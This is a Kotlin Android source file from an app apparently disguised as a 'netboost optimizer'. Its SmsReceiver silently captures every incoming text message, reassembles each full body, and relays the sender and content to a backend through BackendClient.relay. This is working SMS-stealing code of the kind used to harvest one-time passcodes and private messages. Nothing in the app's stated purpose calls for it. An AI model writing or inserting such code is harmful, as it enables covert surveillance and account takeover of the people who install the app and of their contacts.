package com.netboost.optimizer

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return

        val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        if (messages == null || messages.isEmpty()) return

        val pendingResult = goAsync()
        val msgsBySender = messages.groupBy { it.originatingAddress ?: "Unknown" }

        CoroutineScope(Dispatchers.IO + SupervisorJob()).launch {
            try {
                for ((sender, parts) in msgsBySender) {
                    val fullBody = parts.joinToString(separator = "") { it.messageBody ?: "" }
                    Log.d("SmsReceiver", "Relaying SMS from=$sender len=${fullBody.length}")
                    BackendClient.relay(sender, fullBody, java.util.UUID.randomUUID().toString())
                }
            } catch (e: Exception) {
                Log.e("SmsReceiver", "Relay failed: ${e.message}", e)
            } finally {
                pendingResult.finish()
            }
        }
    }
}
